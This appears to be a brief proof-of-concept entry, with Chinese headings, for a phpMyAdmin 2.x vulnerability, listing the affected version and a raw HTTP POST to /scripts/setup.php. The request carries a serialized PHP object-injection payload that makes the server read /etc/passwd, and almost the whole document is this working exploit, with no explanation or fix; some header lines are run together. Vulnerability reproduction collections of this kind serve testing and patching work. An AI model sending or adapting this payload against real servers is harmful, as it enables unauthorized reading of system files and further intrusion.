
## 受影响版本
phpMyAdmin version
	2.x版本

## poc 
```http request
POST /scripts/setup.php HTTP/1.1 
Host: your-ip:8080
Accept-Encoding: gzip, deflate Accept: */*
Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded 
Content-Length: 80


action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}

```